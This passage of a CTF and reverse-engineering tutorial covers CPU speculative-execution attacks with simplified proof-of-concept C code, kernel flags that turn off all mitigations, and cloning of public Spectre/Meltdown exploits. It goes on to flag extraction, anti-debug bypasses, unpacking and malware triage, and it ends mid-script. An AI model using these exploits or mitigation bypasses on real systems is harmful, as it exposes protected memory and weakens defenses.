# /sys/devices/system/cpu/vulnerabilities/meltdown: Mitigation: PTI
# /sys/devices/system/cpu/vulnerabilities/spectre_v1: Mitigation: usercopy/swapgs barriers
# /sys/devices/system/cpu/vulnerabilities/spectre_v2: Mitigation: Full generic retpoline

# Check CPU flags for mitigation features
cat /proc/cpuinfo | grep flags | head -1 | grep -o "ibrs\|ibpb\|stibp\|ssbd"

# ibrs: Indirect Branch Restricted Speculation
# ibpb: Indirect Branch Prediction Barrier
# stibp: Single Thread Indirect Branch Predictors
# ssbd: Speculative Store Bypass Disable
```

**Disabling Mitigations (for testing)**

```bash
# Kernel command line (GRUB)
# WARNING: Only for research/testing
noibrs noibpb nopti nospectre_v2 nospectre_v1 l1tf=off nospec_store_bypass_disable no_stf_barrier mds=off tsx_async_abort=off mitigations=off

# Individual controls
# Disable KPTI (Meltdown mitigation)
nopti

# Disable Spectre v2 mitigations
nospectre_v2

# Disable all mitigations
mitigations=off
```

### Microarchitectural Data Sampling (MDS) Attacks

**MDS Attack Categories**

**Fallout (Store Buffer Data Sampling)**

- Leaks data from store buffer
- Requires speculative execution + cache side channel

**RIDL (Rogue In-Flight Data Load)**

- Leaks in-flight data from various buffers
- Line Fill Buffers, Load Ports, Store Buffers

**ZombieLoad (Microarchitectural Data Sampling)**

```c
// Simplified ZombieLoad concept
void zombieload_leak(void) {
    uint8_t probe_array[256 * 4096];
    
    // Flush probe array
    for (int i = 0; i < 256; i++)
        _mm_clflush(&probe_array[i * 4096]);
    
    // Trigger microarchitectural buffer leak
    // Use invalid/faulting memory access
    uint8_t *invalid_addr = (uint8_t *)0xdeadbeef;
    
    // Speculative execution reads from microarchitectural buffers
    uint8_t leaked = *invalid_addr;
    
    // Encode in cache
    probe_array[leaked * 4096] = 1;
    
    // Probe to recover
    for (int i = 0; i < 256; i++) {
        uint64_t time = time_access(&probe_array[i * 4096]);
        if (time < CACHE_HIT_THRESHOLD) {
            printf("Leaked byte: 0x%02x\n", i);
        }
    }
}
```

[Unverified] Modern CPUs implement microcode updates and buffer clearing (MD_CLEAR) to mitigate MDS

### L1 Terminal Fault (L1TF) / Foreshadow

**L1TF Attack Principle**

- Exploits L1 data cache speculation
- Terminal page faults don't block speculation
- Can leak L1 cache contents across VM boundaries

```c
// Conceptual L1TF attack
void l1tf_attack(uint64_t target_addr) {
    uint8_t probe_array[256 * 4096];
    
    // Create PTE (Page Table Entry) that points to target
    // but marked as not-present (causes terminal fault)
    uint64_t pte = target_addr | 0x7;  // RWX permissions
    pte &= ~0x1;  // Clear present bit
    
    // Map our page with this PTE (requires privileges/vulnerability)
    // ...
    
    // Access will fault, but speculation reads from L1
    uint8_t *mapped_addr = get_virtual_address_for_pte(pte);
    
    // Flush probe array
    for (int i = 0; i < 256; i++)
        _mm_clflush(&probe_array[i * 4096]);
    
    // Trigger speculative access
    uint8_t value = *mapped_addr;
    probe_array[value * 4096] = 1;
    
    // Probe cache
    for (int i = 0; i < 256; i++) {
        if (time_access(&probe_array[i * 4096]) < THRESHOLD)
            printf("Leaked: 0x%02x\n", i);
    }
}
```

**L1TF Mitigations**

```bash
# Check L1TF status
cat /sys/devices/system/cpu/vulnerabilities/l1tf

# Kernel command line mitigation
l1tf=full,force

# Disable SMT (Hyper-Threading) for full mitigation
echo off > /sys/devices/system/cpu/smt/control
```

### Intel TSX (Transactional Synchronization Extensions) Abuse

**TSX for Exception Suppression**

```c
#include <immintrin.h>

// TSX suppresses exceptions within transaction
uint8_t tsx_read_memory(uint64_t addr) {
    uint8_t value = 0;
    
    // Begin transaction
    if (_xbegin() == _XBEGIN_STARTED) {
        // Speculatively read (may fault)
        value = *(volatile uint8_t *)addr;
        
        // Abort transaction (no commit)
        _xend();
    }
    // If fault occurs, transaction aborts silently
    
    return value;
}

// Combined with cache side channel
uint8_t tsx_spectre_attack(uint64_t secret_addr) {
    uint8_t probe_array[256 * 4096];
    int results[256] = {0};
    
    for (int tries = 0; tries < 100; tries++) {
        // Flush probe array
        for (int i = 0; i < 256; i++)
            _mm_clflush(&probe_array[i * 4096]);
        
        // TSX transaction
        if (_xbegin() == _XBEGIN_STARTED) {
            // Speculatively access secret
            uint8_t secret = *(volatile uint8_t *)secret_addr;
            
            // Encode in cache
            probe_array[secret * 4096] = 1;
            
            _xabort(0);  // Abort transaction
        }
        
        // Probe cache
        for (int i = 0; i < 256; i++) {
            if (time_access(&probe_array[i * 4096]) < THRESHOLD)
                results[i]++;
        }
    }
    
    // Find most frequent
    int max_idx = 0;
    for (int i = 1; i < 256; i++) {
        if (results[i] > results[max_idx])
            max_idx = i;
    }
    
    return (uint8_t)max_idx;
}
```

[Unverified] Intel disabled TSX on many CPUs via microcode updates due to security concerns

### Practical Defenses and Mitigations

**Software Mitigations**

**Retpoline (Return Trampoline)**

```asm
; Instead of indirect jump:
; jmp [rax]

; Use retpoline:
call set_up_target
capture_spec:
    pause
    lfence
    jmp capture_spec
set_up_target:
    mov [rsp], rax
    ret
```

**LFENCE Serialization**

```c
// Insert LFENCE to prevent speculation
if (x < array_size) {
    _mm_lfence();  // Serialize execution
    y = array[x];
}
```

**Array Index Masking**

```c
// Instead of:
if (index < array_size) {
    value = array[index];
}

// Use masking:
size_t mask = (index < array_size) - 1;  // All 1s if true, all 0s if false
size_t safe_index = index & mask;
value = array[safe_index];
```

**Hardware Mitigations**

**KPTI (Kernel Page Table Isolation)**

- Separate page tables for user/kernel space
- Kernel memory not mapped in user page tables
- Mitigates Meltdown

**IBRS/IBPB (Indirect Branch Controls)**

```c
// Enable IBRS (Indirect Branch Restricted Speculation)
// Restricts speculative execution of indirect branches
wrmsrl(MSR_IA32_SPEC_CTRL, SPEC_CTRL_IBRS);

// Use IBPB (Indirect Branch Prediction Barrier)
// Prevents branch predictions from affecting future execution
wrmsrl(MSR_IA32_PRED_CMD, PRED_CMD_IBPB);
```

**SSBD (Speculative Store Bypass Disable)**

```c
// Disable speculative store bypass
wrmsrl(MSR_IA32_SPEC_CTRL, SPEC_CTRL_SSBD);
```

**Performance Impact Assessment**

```bash
# Benchmark with/without mitigations
echo "Testing with mitigations enabled..."
perf stat -r 10 ./benchmark

# Reboot with mitigations=off
# Edit /etc/default/grub: GRUB_CMDLINE_LINUX="mitigations=off"
sudo update-grub
sudo reboot

echo "Testing with mitigations disabled..."
perf stat -r 10 ./benchmark

# Compare results
# [Inference] Expect 5-30% performance improvement without mitigations
# depending on workload
```

### Detection Tools and Frameworks

**PoC Detection**

```bash
# Spectre-Meltdown-Checker
git clone https://github.com/speed47/spectre-meltdown-checker
cd spectre-meltdown-checker
sudo ./spectre-meltdown-checker.sh

# Output shows vulnerability status and mitigations
```

**Intel Performance Counter Monitor**

```bash
# Install PCM
git clone https://github.com/opcm/pcm
cd pcm
make

# Monitor for suspicious cache patterns
sudo ./pcm-memory 1

# High LLC (Last Level Cache) miss rates may indicate attacks
```

**Hardware Performance Counters**

```python
#!/usr/bin/env python3
import subprocess

def monitor_cache_attacks():
    """Monitor for cache timing attack indicators"""
    
    # Events that may indicate timing attacks
    events = [
        "cache-misses",
        "cache-references", 
        "LLC-load-misses",
        "LLC-loads",
        "instructions",
        "cycles"
    ]
    
    # Monitor suspicious process
    cmd = ["perf", "stat", "-e", ",".join(events), "-p", "PID"]
    
    # Run monitoring
    # High cache-miss-to-reference ratio may indicate probing
    # Unusual LLC patterns may indicate Flush+Reload/Prime+Probe
```

**Automated Testing**

```bash
# Test for Spectre vulnerability
git clone https://github.com/crozone/SpectrePoC
cd SpectrePoC
make
./spectre.out

# Test for Meltdown
git clone https://github.com/paboldin/meltdown-exploit
cd meltdown-exploit
make
sudo ./run.sh
```

---

## Important Considerations and Next Steps

**Ethical and Legal Warnings**

- These techniques should ONLY be used in authorized testing environments
- Unauthorized exploitation violates computer fraud and abuse laws
- Always obtain written permission before testing systems you don't own
- CTF environments provide safe, legal practice grounds

**Related Topics for Further Study**

**Critical next subtopics:**

- **Return-Oriented Programming (ROP) chain construction** - Essential for modern exploitation
- **Heap exploitation techniques** - Use-after-free, double-free, heap spraying
- **Format string vulnerabilities** - Memory read/write primitives
- **Stack canary bypasses** - Defeating stack protection mechanisms
- **ASLR/PIE bypass techniques** - Information disclosure and brute forcing
- **Kernel exploitation fundamentals** - Privilege escalation and rootkits

**Advanced areas:**

- Modern browser exploitation (V8, SpiderMonkey, JavaScriptCore)
- Hypervisor security and nested virtualization attacks
- Hardware security (TPM, Secure Boot, TrustZone)
- Fuzzing and automated vulnerability discovery
- Binary instrumentation frameworks (PIN, DynamoRIO, Frida)

---

# CTF-Specific Challenges

## Flag Extraction and Verification

### Common Flag Formats

**Standard CTF Flag Patterns:**

```regex
# Generic patterns
CTF\{[a-zA-Z0-9_]+\}
flag\{[a-zA-Z0-9_]+\}
FLAG\{[a-zA-Z0-9_]+\}

# Competition-specific
picoCTF\{[^}]+\}
HTB\{[^}]+\}
CHTB\{[^}]+\}          # Hack The Box
PCTF\{[^}]+\}          # PlaidCTF

# Variable format
[A-Z]{3,8}\{[^\}]{20,}\}    # Most CTF flags
```

**Flag Detection in Binaries:**

```bash
# Method 1: strings with grep
strings -n 8 binary | grep -E "flag\{|FLAG\{|CTF\{"

# Method 2: Case-insensitive search
strings binary | grep -i -E "flag|ctf" | grep "{"

# Method 3: Regex search with ripgrep
rg -i "flag\{.{10,}\}" binary

# Method 4: Search for common prefixes
strings binary | grep -E "^[A-Z]{2,8}\{"

# Method 5: Look for base64/hex encoded flags
strings binary | grep -E "^[A-Za-z0-9+/]{20,}={0,2}$" | base64 -d 2>/dev/null
strings binary | grep -E "^[0-9a-fA-F]{40,}$" | xxd -r -p
```

**Automated Flag Finding Script:**

```python
#!/usr/bin/env python3
import re
import sys
import base64
import binascii

def find_flags(data):
    flags = []
    
    # Pattern 1: Direct flag format
    patterns = [
        rb'[A-Z]{2,10}\{[^\}]{10,100}\}',
        rb'flag\{[^\}]+\}',
        rb'FLAG\{[^\}]+\}',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, data, re.IGNORECASE)
        flags.extend(matches)
    
    # Pattern 2: Base64 encoded flags
    b64_pattern = rb'[A-Za-z0-9+/]{20,}={0,2}'
    for match in re.findall(b64_pattern, data):
        try:
            decoded = base64.b64decode(match)
            if b'{' in decoded and b'}' in decoded:
                flags.append(decoded)
        except:
            pass
    
    # Pattern 3: Hex encoded flags
    hex_pattern = rb'[0-9a-fA-F]{40,}'
    for match in re.findall(hex_pattern, data):
        try:
            decoded = binascii.unhexlify(match)
            if b'{' in decoded and b'}' in decoded:
                flags.append(decoded)
        except:
            pass
    
    return list(set(flags))

if __name__ == '__main__':
    with open(sys.argv[1], 'rb') as f:
        data = f.read()
    
    flags = find_flags(data)
    for flag in flags:
        print(flag.decode('utf-8', errors='ignore'))
```

### Flag Verification Patterns

**Common Verification Methods:**

**1. String Comparison:**

```c
// Simple strcmp
if (strcmp(input, "FLAG{correct_flag}") == 0) {
    printf("Correct!\n");
}

// Detection in disassembly:
// Look for strcmp, memcmp calls
// Find string references
```

**Finding in Ghidra:**

```bash
# Search → For Strings
# Filter: "flag", "correct", "success"
# Check cross-references (XREF)
```

**2. Hash Verification:**

```c
// Compare hash of input
char *input = get_user_input();
char hash[32];
md5(input, hash);
if (memcmp(hash, expected_hash, 32) == 0) {
    printf("Correct!\n");
}

// Detection:
// Look for hash function calls (MD5, SHA256)
// Find hardcoded hash values (32 bytes for MD5, 64 for SHA256)
```

**Cracking Hash Verification:**

```bash
# Extract hash from binary
strings binary | grep -E "^[a-f0-9]{32}$"  # MD5
strings binary | grep -E "^[a-f0-9]{64}$"  # SHA256

# Crack with hashcat
hashcat -m 0 -a 3 hash.txt "FLAG{?a?a?a?a?a?a?a?a}"  # MD5

# Or bruteforce with custom script
python3 << EOF
import hashlib
import itertools
import string

target = "5d41402abc4b2a76b9719d911017c592"  # MD5 of "hello"
charset = string.ascii_letters + string.digits + "_"

for length in range(1, 20):
    for attempt in itertools.product(charset, repeat=length):
        test = ''.join(attempt)
        if hashlib.md5(test.encode()).hexdigest() == target:
            print(f"Found: {test}")
            exit()
EOF
```

**3. Character-by-Character Verification:**

```c
// Check each character
int verify(char *input) {
    if (input[0] != 'F') return 0;
    if (input[1] != 'L') return 0;
    if (input[2] != 'A') return 0;
    // ... more checks
    return 1;
}

// Detection:
// Look for series of comparisons
// Each checking input[offset] against constant
```

**Extracting from Sequential Checks:**

```python
# In GDB/pwndbg - set breakpoint at comparisons
# Watch comparison values

# Script to extract flag
from pwn import *

binary = ELF('./challenge')
comparisons = []

# Find all CMP instructions in verify function
verify_addr = binary.symbols['verify']
code = binary.read(verify_addr, 0x200)

# Parse and extract compared bytes
# [Inference] - Requires disassembly analysis
```

**4. Algorithmic Transformation:**

```c
// Flag undergoes transformation
int verify(char *input) {
    char transformed[50];
    for (int i = 0; i < strlen(input); i++) {
        transformed[i] = (input[i] ^ 0x42) + 10;
    }
    return memcmp(transformed, expected, strlen(input)) == 0;
}

// Reverse the algorithm
for (int i = 0; i < len; i++) {
    original[i] = (expected[i] - 10) ^ 0x42;
}
```

**5. Z3 Constraint Solving:**

```python
from z3 import *

# Example: Flag verification with arithmetic constraints
# input[0] * 2 + input[1] == 165
# input[1] - input[2] == 10
# etc.

solver = Solver()
flag = [BitVec(f'flag_{i}', 8) for i in range(20)]

# Add constraints from reverse engineering
solver.add(flag[0] == ord('F'))
solver.add(flag[1] == ord('L'))
solver.add(flag[2] == ord('A'))
solver.add(flag[3] == ord('G'))
solver.add(flag[4] == ord('{'))

# From disassembly: char[5] * 2 + char[6] == 165
solver.add(flag[5] * 2 + flag[6] == 165)
solver.add(flag[6] - flag[7] == 10)
solver.add(flag[8] ^ 0x42 == 97)

# All printable
for i in range(20):
    solver.add(flag[i] >= 32)
    solver.add(flag[i] <= 126)

if solver.check() == sat:
    model = solver.model()
    result = ''.join(chr(model[flag[i]].as_long()) for i in range(20))
    print(f"Flag: {result}")
```

**6. Angr Symbolic Execution:**

```python
import angr
import claripy

# Load binary
proj = angr.Project('./challenge', auto_load_libs=False)

# Create symbolic input
flag_length = 40
flag_chars = [claripy.BVS(f'flag_{i}', 8) for i in range(flag_length)]
flag = claripy.Concat(*flag_chars)

# Set up initial state
state = proj.factory.entry_state(
    args=['./challenge'],
    stdin=flag
)

# Constrain to printable characters
for c in flag_chars:
    state.solver.add(c >= 0x20)
    state.solver.add(c <= 0x7e)

# Create simulation manager
simgr = proj.factory.simulation_manager(state)

# Find path to success message
success_addr = 0x401234  # Address of "Correct!" string
avoid_addr = 0x401250    # Address of "Wrong!" string

simgr.explore(find=success_addr, avoid=avoid_addr)

if simgr.found:
    found_state = simgr.found[0]
    flag_value = found_state.solver.eval(flag, cast_to=bytes)
    print(f"Flag: {flag_value.decode()}")
else:
    print("No solution found")
```

### Dynamic Flag Extraction

**Runtime Memory Dumping:**

```bash
# GDB approach
gdb ./binary
break *0x401234  # Break before flag check
run
# Enter test input
x/s $rdi         # Examine string at RDI (first argument)
find $rsp, +0x1000, "FLAG{"  # Search stack for flag

# Dump all memory regions
gdb -batch -ex "run" -ex "generate-core-file dump.core" ./binary
strings dump.core | grep "FLAG{"
```

**Frida Memory Search:**

```javascript
// Search memory for flag pattern
Java.perform(function() {
    var ranges = Process.enumerateRanges('r--');
    
    for (var i = 0; i < ranges.length; i++) {
        try {
            Memory.scan(ranges[i].base, ranges[i].size, 
                "46 4c 41 47 7b",  // "FLAG{" in hex
                {
                    onMatch: function(address, size) {
                        console.log('[+] Found at: ' + address);
                        console.log(hexdump(address, {length: 64}));
                    },
                    onComplete: function() {}
                }
            );
        } catch(e) {}
    }
});
```

**LD_PRELOAD Hook:**

```c
// hook.c - Intercept flag verification
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>

int strcmp(const char *s1, const char *s2) {
    printf("[HOOK] strcmp(\"%s\", \"%s\")\n", s1, s2);
    
    // Check if comparing flag
    if (strstr(s1, "FLAG{") || strstr(s2, "FLAG{")) {
        printf("[!] FOUND FLAG: %s\n", strstr(s1, "FLAG{") ? s1 : s2);
    }
    
    // Call original
    int (*orig_strcmp)(const char*, const char*) = dlsym(RTLD_NEXT, "strcmp");
    return orig_strcmp(s1, s2);
}

// Compile: gcc -shared -fPIC hook.c -o hook.so -ldl
// Run: LD_PRELOAD=./hook.so ./binary
```

### Obfuscated Flags

**XOR Encoding:**

```python
# Common pattern in CTFs
encoded = bytes.fromhex("1a3e2b7f...")
key = 0x42  # Or multi-byte key

# Single-byte XOR
decoded = bytes([b ^ key for b in encoded])
print(decoded)

# Multi-byte XOR (repeating key)
key = b"secret"
decoded = bytes([encoded[i] ^ key[i % len(key)] for i in range(len(encoded))])
print(decoded)

# Brute-force single-byte XOR
for key in range(256):
    decoded = bytes([b ^ key for b in encoded])
    if b'FLAG{' in decoded:
        print(f"Key: {key:#x}, Flag: {decoded}")
```

**Base64 Variations:**

```python
import base64

data = "..."

# Standard base64
print(base64.b64decode(data))

# URL-safe base64
print(base64.urlsafe_b64decode(data))

# Base64 with different padding
print(base64.b64decode(data + "="))
print(base64.b64decode(data + "=="))

# Base32
print(base64.b32decode(data))

# Base85
print(base64.b85decode(data))

# Custom alphabet base64
import string
custom_alphabet = string.ascii_lowercase + string.ascii_uppercase + "0123456789+/"
# [Inference] - Requires custom decoder implementation
```

**ROT13/Caesar Cipher:**

```python
import codecs

# ROT13
encoded = "SYNT{grfg}"
decoded = codecs.decode(encoded, 'rot_13')
print(decoded)  # FLAG{test}

# Brute-force Caesar (all shifts)
def caesar_bruteforce(text):
    for shift in range(26):
        result = ""
        for char in text:
            if char.isalpha():
                base = ord('A') if char.isupper() else ord('a')
                result += chr((ord(char) - base + shift) % 26 + base)
            else:
                result += char
        print(f"Shift {shift}: {result}")

caesar_bruteforce("SYNT{grfg}")
```

**Embedded in Image/Audio (Steganography):**

```bash
# Check for appended data
binwalk image.png
foremost image.png

# LSB extraction
stegsolve image.png  # GUI tool

# zsteg (PNG/BMP)
zsteg image.png --all

# steghide (JPEG/WAV)
steghide extract -sf image.jpg -p ""

# Strings in image
strings image.png | grep FLAG

# Hex editor inspection
xxd image.png | tail -n 20
```

## Forensic RE (Finding Hidden Data)

### Section Analysis

**Unusual Section Detection:**

```bash
# List all sections with sizes
readelf -S binary | grep -E "\[|Name"

# Check for non-standard sections
# Standard: .text, .data, .rodata, .bss
# Suspicious: .flag, .secret, .hidden, custom names

# Extract suspicious section
objcopy --dump-section .custom=extracted.bin binary

# Check section entropy
python3 << EOF
import sys
from collections import Counter
import math

def entropy(data):
    if not data:
        return 0
    counts = Counter(data)
    probs = [count / len(data) for count in counts.values()]
    return -sum(p * math.log2(p) for p in probs)

sections = {
    '.text': (0x1000, 0x2000),
    '.custom': (0x3000, 0x100),
}

with open('binary', 'rb') as f:
    for name, (offset, size) in sections.items():
        f.seek(offset)
        data = f.read(size)
        print(f"{name:15} Entropy: {entropy(data):.2f}")
EOF
```

**Padding Analysis:**

```python
# Check for data in section padding
import pefile

pe = pefile.PE('binary.exe')

for section in pe.sections:
    name = section.Name.decode().rstrip('\x00')
    virtual_size = section.Misc_VirtualSize
    raw_size = section.SizeOfRawData
    
    if raw_size > virtual_size:
        padding = raw_size - virtual_size
        print(f"{name}: {padding} bytes padding")
        
        # Extract padding data
        section_data = section.get_data()
        padding_data = section_data[virtual_size:]
        
        # Check if padding contains non-zero data
        if any(b != 0 for b in padding_data):
            print(f"  ⚠ Non-zero padding detected!")
            print(f"  Data: {padding_data[:50]}")
```

### Overlay Data

**PE Overlay Detection:**

```python
import pefile

pe = pefile.PE('binary.exe')

# Calculate expected file size
expected_size = 0
for section in pe.sections:
    section_end = section.PointerToRawData + section.SizeOfRawData
    expected_size = max(expected_size, section_end)

# Check actual file size
import os
actual_size = os.path.getsize('binary.exe')

if actual_size > expected_size:
    overlay_size = actual_size - expected_size
    print(f"Overlay detected: {overlay_size} bytes")
    
    # Extract overlay
    with open('binary.exe', 'rb') as f:
        f.seek(expected_size)
        overlay = f.read()
    
    with open('overlay.bin', 'wb') as f:
        f.write(overlay)
    
    # Analyze overlay
    print(f"Magic bytes: {overlay[:4].hex()}")
    if overlay[:4] == b'\x50\x4b\x03\x04':  # ZIP
        print("Overlay is ZIP archive")
    elif overlay[:2] == b'MZ':
        print("Overlay is PE executable")
```

**ELF Appended Data:**

```bash
# Check for data after last section
readelf -S binary | tail -n 5

# Get file size
ls -lh binary

# Calculate expected size from section headers
# If file size > expected, data is appended

# Extract appended data
# Find offset of last section
LAST_OFFSET=$(readelf -S binary | grep ".data" | awk '{print $5}')
LAST_SIZE=$(readelf -S binary | grep ".data" | awk '{print $6}')
# Calculate: offset + size in hex, convert to decimal
# dd if=binary of=appended.bin bs=1 skip=<decimal_offset>
```

### Dead Code and Unreachable Functions

**Finding Unreferenced Functions:**

```python
# In Ghidra scripting
from ghidra.program.model.symbol import SymbolType

# Get all functions
fm = currentProgram.getFunctionManager()
all_functions = set(fm.getFunctions(True))

# Get all referenced functions
referenced = set()
for func in all_functions:
    refs = func.getSymbol().getReferences()
    for ref in refs:
        from_addr = ref.getFromAddress()
        from_func = fm.getFunctionContaining(from_addr)
        if from_func:
            referenced.add(func)

# Find unreferenced
unreferenced = all_functions - referenced
for func in unreferenced:
    print(f"Unreferenced: {func.getName()} at {func.getEntryPoint()}")
```

**IDA Python Script:**

```python
import idautils
import idaapi

# Get all functions
all_funcs = set(idautils.Functions())

# Get referenced functions
referenced = set()
for func in all_funcs:
    # Get xrefs to function
    for xref in idautils.XrefsTo(func):
        if xref.type == idaapi.fl_CN or xref.type == idaapi.fl_CF:
            referenced.add(func)

# Find unreferenced
unreferenced = all_funcs - referenced
for func in unreferenced:
    name = idaapi.get_func_name(func)
    print(f"0x{func:x}: {name}")
```

**Manually Check Suspicious Functions:**

```bash
# Look for functions with flag-related names
objdump -d binary | grep -E "flag|secret|hidden|win|backdoor"

# Check for debug/unused functions
nm binary | grep -v " U " | grep -E "debug|test|unused"
```

### Anti-Analysis Techniques

**Debugger Detection:**

```c
// Common patterns to identify and bypass

// 1. ptrace check (Linux)
if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
    exit(1);  // Debugger detected
}

// Bypass: Patch comparison or hook ptrace
```

**Bypassing in GDB:**

```bash
# Break at ptrace
catch syscall ptrace

# Modify return value
set $rax = 0

# Or patch binary
# Find ptrace call in disassembly
# Replace with NOP (0x90) or change JNE to JE
```

**Timing Checks:**

```c
// Detect debugger via timing
clock_t start = clock();
// Some operation
clock_t end = clock();
if ((end - start) > threshold) {
    exit(1);  // Too slow, debugger suspected
}

// Bypass: Modify timing values or patch comparison
```

**Parent Process Check (Linux):**

```c
// Check if parent is GDB
char buf[256];
snprintf(buf, sizeof(buf), "/proc/%d/cmdline", getppid());
FILE *f = fopen(buf, "r");
fgets(buf, sizeof(buf), f);
if (strstr(buf, "gdb")) exit(1);
```

**VM Detection:**

```c
// Check for VMware/VirtualBox artifacts
// DMI strings, MAC addresses, device names

// Example: Check for VM MAC prefix
// VMware: 00:50:56, 00:0C:29, 00:05:69
// VirtualBox: 08:00:27
```

**Bypassing Anti-Debug:**

```python
# Frida script to hook anti-debug
import frida

script_code = """
Interceptor.attach(Module.findExportByName(null, "ptrace"), {
    onEnter: function(args) {
        console.log("[*] ptrace called");
    },
    onLeave: function(retval) {
        console.log("[*] ptrace returning: " + retval);
        retval.replace(0);  // Always return 0 (success)
    }
});

Interceptor.attach(Module.findExportByName(null, "clock"), {
    onLeave: function(retval) {
        retval.replace(0);  // Always return 0 (no time passed)
    }
});
"""

session = frida.attach("target_process")
script = session.create_script(script_code)
script.load()
```

### Packed Binaries

**UPX Detection and Unpacking:**

```bash
# Detect UPX
upx -t binary
# Output: binary    Packed with UPX

# Automatic unpack
upx -d binary -o unpacked

# Manual unpacking if modified
# 1. Run until OEP (Original Entry Point)
gdb binary
break *<upx_decompression_end>  # Find via analysis
run

# 2. Dump memory
gdb-pwndbg> dump memory unpacked.bin 0x400000 0x500000

# 3. Fix headers
# Use PE-bear (Windows) or manual editing
```

**Generic Unpacking Approach:**

```bash
# 1. Identify packer
detect-it-easy binary  # DIE tool

# 2. Set breakpoint at tail jump
# Packed code typically ends with JMP to OEP
# Find: JMP [large_address] or JMP eax/rax

# 3. Run to tail jump
gdb binary
break *<tail_jump_address>
run

# 4. Follow jump to OEP
stepi
# Now at Original Entry Point

# 5. Dump unpacked code
dump memory unpacked.bin <start> <end>

# 6. Reconstruct imports
# Use Scylla (Windows) or manual PE/ELF editing
```

**Entropy-Based Packer Detection:**

```python
import math
from collections import Counter

def calculate_entropy(data):
    if not data:
        return 0
    counter = Counter(data)
    length = len(data)
    entropy = 0
    for count in counter.values():
        p = count / length
        entropy -= p * math.log2(p)
    return entropy

# High entropy (>7.0) suggests compression/encryption
with open('binary', 'rb') as f:
    data = f.read()
    
# Calculate entropy of different sections
chunk_size = 1024
for i in range(0, len(data), chunk_size):
    chunk = data[i:i+chunk_size]
    ent = calculate_entropy(chunk)
    if ent > 7.0:
        print(f"Offset {i:#x}: Entropy {ent:.2f} - Possibly packed")
```

### Code Cave Analysis

**Finding Code Caves:**

```bash
# Code cave: Sequence of null bytes in executable section

# Search for null byte sequences
objdump -d binary | grep -A5 "00 00 00 00"

# Python script to find caves
python3 << EOF
with open('binary', 'rb') as f:
    data = f.read()

# Find sequences of at least 16 null bytes
cave_size = 16
offset = 0
while True:
    offset = data.find(b'\x00' * cave_size, offset)
    if offset == -1:
        break
    
    # Check how long the cave is
    length = 0
    while offset + length < len(data) and data[offset + length] == 0:
        length += 1
    
    if length >= cave_size:
        print(f"Cave at offset {offset:#x}, size: {length} bytes")
    
    offset += length + 1
EOF
```

**Analyzing Cave Contents:**

```python
# Check if cave contains hidden data (non-null bytes after initial nulls)
import re

with open('binary', 'rb') as f:
    data = f.read()

# Pattern: nulls followed by non-null data followed by nulls
pattern = rb'\x00{10,}[\x01-\xFF]{10,}\x00{10,}'
matches = re.finditer(pattern, data)

for match in matches:
    offset = match.start()
    content = match.group()
    print(f"Hidden data at {offset:#x}:")
    print(content.hex())
    
    # Try to decode
    try:
        print(f"  ASCII: {content.decode('ascii', errors='ignore')}")
    except:
        pass
```

## Malware Analysis (CTF-Style)

### Static Analysis Techniques

**Initial Triage:**

```bash
# File type and architecture
file malware.bin

# Check for packers/obfuscation
detect-it-easy malware.bin

# Calculate hashes
md5sum malware.bin
sha256sum malware.bin

# Check VirusTotal (if allowed by CTF rules)
# Usually not allowed in CTF, but useful for real malware

# Extract strings
strings malware.bin > strings.txt
strings -e l malware.bin > strings_unicode.txt  # Unicode strings

# Check for interesting strings
grep -i -E "(http|ftp|dns|ip|password|key|flag)" strings.txt
```

**Import/Export Analysis:**

```bash
# PE imports
python3 << EOF
import pefile
pe = pefile.PE('malware.exe')

print("Imports:")
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print(f"\n{entry.dll.decode()}:")
    for imp in entry.imports:
        if imp.name:
            print(f"  {imp.name.decode()}")
            
# Suspicious imports to look for:
# VirtualAlloc, WriteProcessMemory (injection)
# CreateRemoteThread (injection)
# URLDownloadToFile, InternetOpen (network)
# CreateProcess (execution)
# RegSetValue, RegCreateKey (persistence)
EOF

# ELF imports
readelf -s malware.elf | grep UND
```

**Suspicious API Patterns:**

|Category|Windows APIs|Linux Syscalls|
|---|---|---|
|Code Injection|VirtualAllocEx, WriteProcessMemory, CreateRemoteThread|ptrace, process_vm_writev|
|Persistence|RegSetValueEx, CreateService, SetWindowsHookEx|crontab, systemd files|
|Network|InternetOpenUrl, HttpSendRequest, socket|socket, connect, send|
|Anti-Analysis|IsDebuggerPresent, CheckRemoteDebuggerPresent|ptrace(PTRACE_TRACEME)|
|File Operations|CreateFile, WriteFile, DeleteFile|open, write, unlink|
|Crypto|CryptEncrypt, CryptDecrypt, BCrypt*|OpenSSL functions|

**Disassembly Analysis:**

```bash
# Full disassembly
objdump -d -M intel malware > disasm.txt

# Focus on main/suspicious functions
# Look for:
# - Unusual control flow (anti-disassembly)
# - Obfuscated strings
# - Network operations
# - File I/O
# - Registry access

# Graphical analysis
ghidra malware.bin  # Or IDA Pro
# Navigate to entry point
# Follow calls to identify functionality
```

### Dynamic Analysis in Isolated Environment

**Safe Execution Environment:**

```bash
# [Inference] - For CTF purposes, typically use:
# - Virtual machine (VirtualBox, VMware)
# - Docker container
# - Isolated network

# VM snapshot before analysis
# Restore after completion
```

**Monitoring Tools Setup:**

```bash
# Linux monitoring
# 1. strace - syscall tracing
strace -o trace.log -f ./malware

# Key syscalls to watch:
# - open, read, write (file I/O)
# - socket, connect, send (network)
# - execve (execution)
# - ptrace (anti-debug)

# 2. ltrace - library call tracing
ltrace -o ltrace.log -f ./malware

# 3. tcpdump - network monitoring
sudo tcpdump -i any -w capture.pcap &
./malware
sudo pkill tcpdump

# Analyze capture
wireshark capture.pcap

# 4. Process monitoring
ps aux | grep malware
lsof -p <pid>  # Open files and network connections
```

**Windows Monitoring:**

```bash
# Procmon - Process Monitor (Sysinternals)
# Filter for malware.exe
# Monitor: Registry, File System, Network, Process

# Process Explorer
# View process tree
# Check loaded DLLs
# View handles (files, registry, mutexes)

# Wireshark for network
# TCPView for active connections

# Regshot - Registry comparison
# Take snapshot before/after execution
```

**Behavioral Analysis:**

```python
# Python script to monitor file changes
import os
import hashlib
import time
import json

def get_files(directory):
    files = {}
    for root, dirs, filenames in os.walk(directory):
        for filename in filenames:
            filepath = os.path.join(root, filename)
            try:
                with open(filepath, 'rb') as f:
                    files[filepath] = hashlib.md5(f.read()).hexdigest()
            except:
                pass
    return files

# Snapshot before
before = get_files('/tmp')

# Run malware (in VM!)
os.system('./malware &')
time.sleep(5)

# Snapshot after
